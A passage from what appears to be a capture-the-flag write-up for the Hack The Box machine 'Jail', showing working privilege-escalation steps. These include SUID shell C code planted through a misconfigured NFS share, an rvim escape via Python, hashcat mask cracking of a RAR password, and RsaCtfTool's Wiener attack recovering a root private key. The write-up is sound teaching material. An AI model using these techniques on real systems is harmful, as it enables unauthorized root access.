    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
    _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User nobody may run the following commands on this host:
    (frank) NOPASSWD: /opt/logreader/logreader.sh

```

I’ll remember this script from my NFS enumeration [above](#nfs---tcp-2049).

In `/opt`, I don’t actually have permissions to enter or read the `logreader` directory:

```

bash-4.2$ $ ls -l
total 0
drwxr-x---+ 2 root root 26 Jun 26  2017 logreader
drwxr-xr-x. 2 root root  6 Mar 26  2015 rh

```

I can’t edit the script, or even enter the directory. There is an extended attribute on `logreader`. It doesn’t matter here, but I’ll look at it in [Beyond Root](#reading-logreadersh).

#### NFS

I looked at NFS from the outside already. I’ll look at `/etc/exports` to see how those shares are mounted:

```

bash-4.2$ $ cat /etc/exports
/var/nfsshare *(rw,sync,root_squash,no_all_squash)
/opt *(rw,sync,root_squash,no_all_squash)

```

`root_squash` means if I’m running as root on my local system, that will be treated as the default nobody user on Jail, so I won’t be able to read files as root. `no_all_squash` means that every other user permission will translate from my system to Jail. So oxdf on my system (user id 1000) can read as frank (user id 1000) on Jail.

### NFS SetUID

#### Shell

I’ve shown writing short C code a few times before ([Laboratory](/2021/04/17/htb-laboratory.html#shell) and [TarTarSauce](/2018/10/21/htb-tartarsauce-part-2-backuperer-follow-up.html#creating-suid-shell)). That same C code will work here:

```

#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setresuid(1000, 1000, 1000);
    system("/bin/bash");
    return 0;
}

```

I will need to update the id number from 0 to 1000, since the binary is SUID owned by frank not root.

I got a bit lucky on this one, as there’s actually some trickiness that I just happened to avoid with the way I called that. I hope to write a post about that sometime soon.

I’ll compile this and save it over NFS into `/var/nfsshare`, and set it as SUID:

```

oxdf@hacky$ gcc 0xdf.c -o /mnt/nfsshare/0xdf
oxdf@hacky$ chmod 4777 /mnt/nfsshare/0xdf

```

Because users are not squashed, the files go owned as user 1000 (oxdf on my system, frank on Jail).

I’ll run that via my shell:

```

bash-4.2$ $ /var/nfsshare/0xdf
[frank@localhost /]$ $ id
uid=1000(frank) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0

```

This gives a shell with userid set to frank.

#### SSH

I’ll get a more solid shell by writing an SSH key as frank and connecting over SSH:

```

[frank@localhost /]$ $ cd ~/.ssh
[frank@localhost .ssh]$ $ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> ~/.ssh/authorized_keys

```

Now I can connect over SSH:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen frank@10.10.10.34
[frank@localhost ~]$ 

```

I can claim `user.txt`:

```

[frank@localhost ~]$ cat user.txt
d084f1b7************************

```

## Shell as adm

### Enumeration

As frank, there’s another `sudo` command I can run as adm with no password:

```

[frank@localhost ~]$ sudo -l
Matching Defaults entries for frank on this host:
    !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME
    LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User frank may run the following commands on this host:
    (frank) NOPASSWD: /opt/logreader/logreader.sh
    (adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c

```

### rvim Escape

I’ll run `sudo` to open the `jail.c` file as adm:

```

[frank@localhost ~]$ sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c

```

I’m dropped into a `vim` window with the contents of `jail.c`. In regular `vi` / `vim`, I could just type `:![command]` to execute that command. So `:!bash` would drop to a shell. But that’s blocked in `rvim` (restricted `vim`), as it says on the [man page](https://linux.die.net/man/1/rvim):

> rvim rview rgvim rgview
>
> Like the above, but with restrictions. It will not be possible to start shell commands, or suspend **Vim.** Can also be done with the “-Z” argument.

Still, there’s a [GTFObins page](https://gtfobins.github.io/gtfobins/rvim/) on `rvim`, and it’s still possible to escape, typically using `python` or `lua`. The entry shows how to start it from the command line:

![image-20220521102341336](https://0xdfimages.gitlab.io/img/image-20220521102341336.png)

I can’t do that, as I can only run the specific command to open that one file. Still, I can do the same thing from within `rvim`. Once open, I’ll type `:py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")`, and it drops to a shell:

```

sh-4.2$ id
uid=3(adm) gid=4(adm) groups=4(adm) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

```

That looks like it’s just running Python commands. I could instead of using `os.excel`, use `:py import pty;pty.spawn("/bin/bash")` to get the same result.

## Shell as root

### Enumeration

#### Find Homedir

I’ll start by looking for files owned by the `adm` group. After removing the stuff I don’t care about in `/proc`, there’s mostly files in `/var/adm`:

```

bash-4.2$ find / -group adm 2>/dev/null | grep -v -e ^/proc
/var/tmp/jail.c.swp
/var/adm
/var/adm/.keys
/var/adm/.keys/note.txt
/var/adm/.keys/.local
/var/adm/.keys/.local/.frank
/var/adm/.keys/keys.rar
/var/www/html/jailuser/dev/jail.c

```

The `/var/tmp/jail.c.swp` is likely left over from my exploitation of `rvim` to get to adm.

`/var/adm` is adm’s home directory:

```

bash-4.2$ echo $HOME
/var/adm

```

#### .keys

There are three files in this home directory:

```

bash-4.2$ find ~ -type f
/var/adm/.keys/note.txt
/var/adm/.keys/.local/.frank
/var/adm/.keys/keys.rar

```

`note.txt` defines what the password system is for the organization:

```

Note from Administrator:
Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol.

```

`keys.rar` contains the root public key (at least according to the name):

```

sh-4.2$ unrar l keys.rar 

UNRAR 5.00 freeware      Copyright (c) 1993-2013 Alexander Roshal

Archive: keys.rar
Details: RAR 4

 Attributes      Size    Date   Time   Name
----------- ---------  -------- -----  ----
*-rw-r--r--       451  03-07-17 12:34  rootauthorizedsshkey.pub
----------- ---------  -------- -----  ----
                  451                  1

```

Trying to extract it shows it’s encrypted, and requires a password:

```

sh-4.2$ unrar x keys.rar 

UNRAR 5.00 freeware      Copyright (c) 1993-2013 Alexander Roshal

Extracting from keys.rar

Enter password (will not be echoed) for rootauthorizedsshkey.pub:

```

`/.local/.frank` has what looks like gibberish:

```

Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!

```

### Decrypt Rar

#### Decode .frank

There are solvers like [quipquip](https://www.quipqiup.com/) that will decode ciphers like this one. Putting it in returns the plaintext:

[![image-20220521105429666](https://0xdfimages.gitlab.io/img/image-20220521105429666.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220521105429666.png)

> Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!

This is actually the [Atbash cipher](http://rumkin.com/tools/cipher/atbash.php), a simple substitution cipher where A -> Z, B -> Y, C -> X, etc.

#### Find Password

Some googling about people who have escaped from Alcatraz shows [three people](https://www.fbi.gov/history/famous-cases/alcatraz-escape):
- John Anglin
- Clarence Anglin
- Frank Morris

Given that the user on Jail is frank, I’ll guess it’s supposed to be Frank Morris.

#### Generate Word List

Hashcat has a really nice rules syntax for generating wordlists. I don’t get to show it on HTB that often, as typically those passwords are in `rockyou.txt`. In the help for `hashcat` it defines the different character sets:

```
- [ Built-in Charsets ] -

  ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz [a-z]
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]
  d | 0123456789                 [0-9]
  h | 0123456789abcdef           [0-9a-f]
  H | 0123456789ABCDEF           [0-9A-F]
  s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff

```

So for this, I’ll generate a list using `Morris?d?d?d?d?s`:

```

$ /opt/hashcat-6.2.5/hashcat.bin --stdout -a 3 Morris?d?d?d?d?s > frank-passwords

```

#### Exfil keys.rar

To get `keys.rar` to my host, I’ll drop a copy in `/tmp` and make it world-readable:

```

sh-4.2$ cp keys.rar /tmp/
sh-4.2$ chmod 666 /tmp/keys.rar 

```

Now I can `scp` it with frank:

```

oxdf@hacky$ scp -i ~/keys/ed25519_gen frank@10.10.10.34:/tmp/keys.rar .
keys.rar              100%  475     5.3KB/s   00:00

```

#### Create Hash

To get this into a format that can be brute forces, I’ll need to run `rar2john`:

```

oxdf@hacky$ rar2john keys.rar | tee keys.rar.hash
! file name: rootauthorizedsshkey.pub
keys.rar:$RAR3$*1*723eaa0f90898667*eeb44b5b*384*451*1*a4ef3a3b7fab5f8ea48bd08c77bfaa082d3da7dc432f9805f1683073b9992bdc24893a6f5cee2f9a6339d1b6ab155262e798c3de5f49f2f6abe623026fcf8bae99f67bbf6b5c52b392d049d9edff7122d46514afdf7710164dbef5be373c30e3503e8843a1556e373bdaccbaffc6ccbbb93c318b49585447b0b4f02178b464caddfefc9d545abbbd08943d86edec7d12b1c5d8e1cac47fd6a79fd890ca5e95d37e2d96e319f5543a0e6917939dde9126dbdff0a4e7fd616fdaa3d91a414143535bbd1f4086c35e370ea7ea8a7ab97c71fa43768ec90d165b98906e61de7380510048a1eb7b0deca6a43f819acd3ba9bf56f23f6546ba0d39aa860b8760a0bcdfc73d273cc3996e7675a7ae3cc66d753cf6074127cf9781755d972dba1fc7a640de7218728e8324cbd4f4dc4e7da2e09d38ff256455020523a0481051d732583116a03621f8045b01f1beab2a91845f2e8e052a61635b5d8f05c4cb2b4cf75c586cfcdf8f0e66c3161fd352e52f3f29e2281995356217e93ffeaca388a15829d6*33:1::rootauthorizedsshkey.pub 

```

`tee` will save it to a file, and let me look at the output.

#### Crack

I wasn’t able to find any format in the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page that exactly matched. 23800 looked close, but only if the hash stopped at `*33`, removing the `:1::rootauthorizedsshkey.pub`. I’ll try as it was generated, but `hashcat` doesn’t recognize it.

I’ll remove the end from `:1::...`, and it does! I’ll need `--user` because of the `key.rar:` at the front. It breaks in about 1.5 minutes on my machine:

```

$ /opt/hashcat-6.2.5/hashcat.bin keys.rar.hash2 frank-passwords --user --potfile-disable
...[snip]...
$RAR3$*1*723eaa0f90898667*eeb44b5b*384*451*1*a4ef3a3b7fab5f8ea48bd08c77bfaa082d3da7dc432f9805f1683073b9992bdc24893a6f5cee2f9a6339d1b6ab155262e798c3de5f49f2f6abe623026fcf8bae99f67bbf6b5c52b392d049d9edff7122d46514afdf7710164dbef5be373c30e3503e8843a1556e373bdaccbaffc6ccbbb93c318b49585447b0b4f02178b464caddfefc9d545abbbd08943d86edec7d12b1c5d8e1cac47fd6a79fd890ca5e95d37e2d96e319f5543a0e6917939dde9126dbdff0a4e7fd616fdaa3d91a414143535bbd1f4086c35e370ea7ea8a7ab97c71fa43768ec90d165b98906e61de7380510048a1eb7b0deca6a43f819acd3ba9bf56f23f6546ba0d39aa860b8760a0bcdfc73d273cc3996e7675a7ae3cc66d753cf6074127cf9781755d972dba1fc7a640de7218728e8324cbd4f4dc4e7da2e09d38ff256455020523a0481051d732583116a03621f8045b01f1beab2a91845f2e8e052a61635b5d8f05c4cb2b4cf75c586cfcdf8f0e66c3161fd352e52f3f29e2281995356217e93ffeaca388a15829d6*33:Morris1962!
...[snip]...

```

The password is “Morris1962!”. Many people solved that by guessing, as 1962 is the year that he escaped, and “!” is a common symbol. But it’s good to know how to generate these wordlists.

#### unrar

With that password I can extract the file:

```

oxdf@hacky$ unrar e keys.rar 

UNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal

Extracting from keys.rar

Enter password (will not be echoed) for rootauthorizedsshkey.pub: 

Extracting  rootauthorizedsshkey.pub                                  OK 
All OK
oxdf@hacky$ cat rootauthorizedsshkey.pub 
-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQYHLL65S3kVbhZ6kJnpf072
YPH4Clvxj/41tzMVp/O3PCRVkDK/CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//
DmcIo1pJGKy8LDrwdpsSjVmvSgg39nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6Pd
D/qlaFM8B87MHZlW1fqe6QKBgQVY7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/w
Wt2/7A1Xgi5ckTFMG5EXhfv67GfCFE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAx
I85LArqOGc6QoVPS7jx5h5bK/3Oqm3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFug
a99GCw==
-----END PUBLIC KEY-----

```

### Crack Public Key

There’s a great tool, [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool), that will try a bunch of different well known cryptography attacks against a public key. I’ll clone it on to my machine, and run it, giving it the public key and `--private` so that it will show the private key if it cracks it. After a few minutes, it does:

```

oxdf@hacky$ /opt/RsaCtfTool/RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private 

[*] Testing key rootauthorizedsshkey.pub.
[*] Performing factordb attack on rootauthorizedsshkey.pub.
[*] Performing fibonacci_gcd attack on rootauthorizedsshkey.pub.
100%|███████████████████████████████████████████████████████████████████████████| 9999/9999 [00:00<00:00, 157548.15it/s]
[*] Performing system_primes_gcd attack on rootauthorizedsshkey.pub.
100%|██████████████████████████████████████████████████████████████████████████| 7007/7007 [00:00<00:00, 1363275.26it/s]
[*] Performing pastctfprimes attack on rootauthorizedsshkey.pub.
100%|████████████████████████████████████████████████████████████████████████████| 113/113 [00:00<00:00, 1419030.99it/s]
[*] Performing nonRSA attack on rootauthorizedsshkey.pub.
...[snip]...
[*] Attack success with wiener method !

Results for rootauthorizedsshkey.pub:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRVkDK/
...[snip]...
hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
-----END RSA PRIVATE KEY-----

```

I’ll save that to a file and `chmod` it to 600 so SSH will use it:

```

oxdf@hacky$ vim ~/keys/jail-root
oxdf@hacky$ chmod 600 ~/keys/jail-root

```

### SSH

With the key I can get a shell as root:

```

oxdf@hacky$ ssh -i ~/keys/jail-root root@10.10.10.34
[root@localhost ~]# 

```

And grab `root.txt`:

```

[root@localhost ~]# cat root.txt
7c541d7e************************

```

## Beyond Root - NFS

### Reading logreader.sh

#### Shouldn’t Be Able To Read That

When initially enumerating NFS, I was really surprised that I could actually read `logreader.sh`. I’ll mount the `opt` share on `/mnt/opt`, and look at the permissions in that directory:

```

oxdf@hacky$ ls -l
total 0
drwxr-x--- 2 root root 26 Jun 26  2017 logreader
drwxr-xr-x 2 root root  6 Mar 26  2015 rh

```

Based on that reading, I shouldn’t be able to `cd` into `logreader` or read files or anything. But I can:

```

oxdf@hacky$ cd logreader/
oxdf@hacky$ ls
logreader.sh
oxdf@hacky$ ls -l 
total 4
-rwxr-x--- 1 root root 52 Jun 26  2017 logreader.sh
oxdf@hacky$ cat logreader.sh 
#!/bin/bash
/bin/cat /home/frank/logs/checkproc.log

```

The permissions on `logreader.sh` show `-rwxr-x--- 1 root root`, which means that a non-root user *shouldn’t* be able to read.

#### From Jail

From a shell on Jail, the same permissions show:

```

[root@localhost opt]# ls -l
total 0
drwxr-x---+ 2 root root 26 Jun 26  2017 logreader
drwxr-xr-x. 2 root root  6 Mar 26  2015 rh

```

Except one difference - There’s a `+` at the end. From the [man page](https://linux.die.net/man/5/acl) for acl, this means:

> For files that have a default ACL or an access ACL that contains morethan the three required ACL entries, the ls(1) utility in the longform produced by ls -l displays a plus sign (+) after the permissionstring.

I can read the ACL with `getfacl`:

```

[root@localhost opt]# getfacl logreader/
# file: logreader/
# owner: root
# group: root
user::rwx
user:frank:r-x
group::r-x
mask::r-x
other::---

```

In addition to the typical Linux permissions, frank has been granted access to the folder to read and change into (`x` on a folder).

#### Explanation

So the oxdf user on my box is uid 1000:

```

oxdf@hacky$ id
uid=1000(oxdf) gid=1000(oxdf) groups=1000(oxdf),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare),139(libvirt),998(vboxsf)

```

As is frank on Jail:

```

[frank@localhost ~]$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

```

So even though NFS doesn’t display extended ACLs on the file, when oxdf tries to access this file over NFS, because users are not squashed, Jail sees that as user id 1000, or frank, and then the file system allows it based on the ACL.

I can check this by changing to a different user on my box:

```

oxdf@hacky$ sudo su news -s /bin/bash
news@hacky:/mnt/opt$ id
uid=9(news) gid=9(news) groups=9(news)
news@hacky:/mnt/opt$ ls -l logreader/
ls: cannot open directory 'logreader/': Permission denied
news@hacky:/mnt/opt$ cd logreader/
bash: cd: logreader/: Permission denied

```

Even more interesting, I can’t access this folder as root:

```

oxdf@hacky$ sudo su
root@hacky:/mnt/opt# cd logreader/
bash: cd: logreader/: Permission denied

```

That’s because root is configured to squash on Jail. So when I am root locally, Jail’s NFS instance makes that the nobody user, and that user can’t access `logreader`.

So it’s only because I got lucky that the user I run as had the same uid as frank that I was able to access this folder (not that it mattered, other than being interesting).

### Alternative NFS Abuse - Priv to adm

#### Background

I noted above that frank has write and enter the directory (`x` bit in the permissions). frank can’t change those permissions, because the directory is owned by root.

I’ve shown how my user id 1000 (oxdf) can write files as Jail’s user id 1000, and change the permissions (making them SUID). Is there any way that I can abuse this to get execution as another user?

I can’t really target root. Because of the `root_squash` configuration, anything I do as root on my VM will be done as nobody on Jail.

To get execution as adm, I’d need to be able to create a file owned by adm and set it to SUID. But adm doesn’t have write permissions to the NFS share.

#### Directory

I’ll make a directory as oxdf in the NFS share:

```

oxdf@hacky$ mkdir /mnt/nfsshare/0xdf

```

I can’t see it from the share, but as root, I’ll take a look:

```

[root@localhost nfsshare]# ls -l
total 0
drwxrwxr-x. 2 frank frank 6 May 22 10:52 0xdf

```

Only the frank user and group can write to it. I’ll change that:

```

oxdf@hacky$ chmod 777 /mnt/nfsshare/0xdf

```

Now the directory is world writeable:

```

[root@localhost nfsshare]# ls -l
total 0
drwxrwxrwx. 2 frank frank 6 May 22 10:52 0xdf

```

The adm user is userid 3:

```

[root@localhost nfsshare]# grep adm /etc/passwd
adm:x:3:4:adm:/var/adm:/sbin/nologin

```

On my machine, the sys user is user id 3, and group 3. I’ll temporarily change that group id to 4 in `/etc/passwd`:

```

oxdf@hacky$ grep sys: /etc/passwd
sys:x:3:4:sys:/dev:/usr/sbin/nologin

```

Trying to run as a user with the shell set to `nologin` will fail:

```

oxdf@hacky$ sudo su sys
This account is currently not available.

```

But I can specify another shell with `-s`:

```

oxdf@hacky$ sudo su sys -s /bin/bash
sys@hacky$

```

I’ll update the C code to get execution as adm:

```

#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setresuid(3, 3, 3);
    system("/bin/bash");
    return 0;
}

```

Now I can compile the same shell binary and set it to SUID:

```

sys@hacky$ gcc adm.c -o /mnt/nfsshare/0xdf/adm
sys@hacky$ chmod 4777 /mnt/nfsshare/0xdf/adm

```

It seems to have worked:

```

[frank@localhost 0xdf]$ pwd
/var/nfsshare/0xdf
[frank@localhost 0xdf]$ ls -l
total 20
-rwsrwxrwx. 1 adm adm 16744 May 22 11:15 adm

```

Running it as frank returns a shell with uid as adm:

```

[frank@localhost 0xdf]$ ./adm 
bash: /home/frank/.bashrc: Permission denied
bash-4.2$ id
uid=3(adm) gid=1000(frank) groups=1000(frank) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

```

#### Fixing Group

Interestingly, the `/var/adm` directory is owned by root, and has the adm group:

```

bash-4.2$ cd /var/adm/
bash: cd: /var/adm/: Permission denied
bash-4.2$ ls -ld /var/adm
drwxr-x---. 3 root adm 19 Jul  3  2017 /var/adm

```

So even though the shell’s uid is adm, it can’t enter or interact with these files for the next step. I’ll update my code:

```

#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setresuid(3, 3, 3);
    setresgid(4, 4, 4);
    system("/bin/bash");
    return 0;
}

```

Now it includes a call to make sure the group IDs are all 4, adm on Jail.

I’ll set both the SUID bit (4) *and* the SGID bit (2) with 6:

```

sys@hacky$ gcc adm.c -o /mnt/nfsshare/0xdf/adm
sys@hacky$ chmod 6777 /mnt/nfsshare/0xdf/adm

```

Now running that as frank returns a shell with both the user and group ids as adm:

```

[frank@localhost 0xdf]$ ./adm 
bash: /home/frank/.bashrc: Permission denied
bash-4.2$ id
uid=3(adm) gid=4(adm) groups=4(adm),1000(frank) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

```

And I can access the files:

```

bash-4.2$ find . -type f -readable
./.keys/note.txt
./.keys/.local/.frank
./.keys/keys.rar

```

[SetUID Rabbithole »](/2022/05/31/setuid-rabbithole.html)